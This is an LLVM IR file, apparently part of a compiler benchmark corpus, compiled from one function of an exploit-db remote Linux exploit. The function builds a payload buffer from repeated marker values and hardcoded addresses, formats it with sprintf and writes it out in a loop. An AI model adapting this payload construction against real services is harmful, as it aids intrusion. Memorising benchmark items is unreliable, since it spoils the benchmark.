; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_660.c_build1.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_660.c_build1.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@fill = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @build1(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  store i32 -1, i32* %10, align 4
  store i32 1094795585, i32* %11, align 4
  store i32 135851817, i32* %12, align 4
  store i32 33686018, i32* %13, align 4
  store i32 135825320, i32* %14, align 4
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 8
  %17 = call i64 @malloc(i32 %16)
  %18 = inttoptr i64 %17 to i8*
  store i8* %18, i8** %7, align 8
  %19 = load i8*, i8** %7, align 8
  store i8* %19, i8** %5, align 8
  store i32 0, i32* %9, align 4
  br label %20

20:                                               ; preds = %82, %2
  %21 = load i32, i32* %9, align 4
  %22 = load i32, i32* %3, align 4
  %23 = sub nsw i32 %22, 8
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %85

25:                                               ; preds = %20
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = inttoptr i64 %27 to i32*
  %29 = load i8*, i8** %5, align 8
  %30 = bitcast i8* %29 to i32**
  store i32* %28, i32** %30, align 8
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 4
  store i8* %32, i8** %5, align 8
  %33 = load i32, i32* %11, align 4
  %34 = sext i32 %33 to i64
  %35 = inttoptr i64 %34 to i32*
  %36 = load i8*, i8** %5, align 8
  %37 = bitcast i8* %36 to i32**
  store i32* %35, i32** %37, align 8
  %38 = load i8*, i8** %5, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  store i8* %39, i8** %5, align 8
  %40 = load i32, i32* %12, align 4
  %41 = sext i32 %40 to i64
  %42 = inttoptr i64 %41 to i32*
  %43 = load i8*, i8** %5, align 8
  %44 = bitcast i8* %43 to i32**
  store i32* %42, i32** %44, align 8
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 4
  store i8* %46, i8** %5, align 8
  %47 = load i32, i32* %14, align 4
  %48 = sext i32 %47 to i64
  %49 = inttoptr i64 %48 to i32*
  %50 = load i8*, i8** %5, align 8
  %51 = bitcast i8* %50 to i32**
  store i32* %49, i32** %51, align 8
  %52 = load i8*, i8** %5, align 8
  %53 = getelementptr inbounds i8, i8* %52, i64 4
  store i8* %53, i8** %5, align 8
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = inttoptr i64 %55 to i32*
  %57 = load i8*, i8** %5, align 8
  %58 = bitcast i8* %57 to i32**
  store i32* %56, i32** %58, align 8
  %59 = load i8*, i8** %5, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 4
  store i8* %60, i8** %5, align 8
  %61 = load i32, i32* %11, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i32*
  %64 = load i8*, i8** %5, align 8
  %65 = bitcast i8* %64 to i32**
  store i32* %63, i32** %65, align 8
  %66 = load i8*, i8** %5, align 8
  %67 = getelementptr inbounds i8, i8* %66, i64 4
  store i8* %67, i8** %5, align 8
  %68 = load i32, i32* %12, align 4
  %69 = sext i32 %68 to i64
  %70 = inttoptr i64 %69 to i32*
  %71 = load i8*, i8** %5, align 8
  %72 = bitcast i8* %71 to i32**
  store i32* %70, i32** %72, align 8
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 4
  store i8* %74, i8** %5, align 8
  %75 = load i32, i32* %13, align 4
  %76 = sext i32 %75 to i64
  %77 = inttoptr i64 %76 to i32*
  %78 = load i8*, i8** %5, align 8
  %79 = bitcast i8* %78 to i32**
  store i32* %77, i32** %79, align 8
  %80 = load i8*, i8** %5, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 4
  store i8* %81, i8** %5, align 8
  br label %82

82:                                               ; preds = %25
  %83 = load i32, i32* %9, align 4
  %84 = add nsw i32 %83, 36
  store i32 %84, i32* %9, align 4
  br label %20

85:                                               ; preds = %20
  %86 = load i32, i32* %3, align 4
  %87 = add nsw i32 %86, 1
  %88 = call i64 @malloc(i32 %87)
  %89 = inttoptr i64 %88 to i8*
  store i8* %89, i8** %8, align 8
  %90 = load i8*, i8** %8, align 8
  store i8* %90, i8** %6, align 8
  %91 = load i8*, i8** %6, align 8
  %92 = load i8*, i8** @fill, align 8
  %93 = load i8*, i8** %7, align 8
  %94 = call i32 @sprintf(i8* %91, i8* %92, i8* %93)
  store i32 0, i32* %9, align 4
  br label %95

95:                                               ; preds = %102, %85
  %96 = load i32, i32* %9, align 4
  %97 = load i32, i32* %4, align 4
  %98 = icmp slt i32 %96, %97
  br i1 %98, label %99, label %105

99:                                               ; preds = %95
  %100 = load i8*, i8** %8, align 8
  %101 = call i32 @xp_write(i8* %100)
  br label %102

102:                                              ; preds = %99
  %103 = load i32, i32* %9, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %9, align 4
  br label %95

105:                                              ; preds = %95
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @xp_write(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
